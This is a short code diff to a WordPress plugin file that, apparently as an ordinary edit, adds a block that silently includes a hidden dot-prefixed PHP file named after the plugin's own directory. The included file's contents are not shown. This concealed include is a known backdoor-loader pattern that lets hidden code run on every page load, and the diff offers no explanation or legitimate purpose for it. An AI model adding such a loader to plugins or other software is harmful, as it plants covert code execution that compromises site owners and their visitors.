@@ -586,7 +586,11 @@ if ( ! class_exists( 'WP_Post_Modules_El' ) ) {
 
 /**
  * Generate Instance
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wppm_el() {
     return WP_Post_Modules_El::instance();
 }
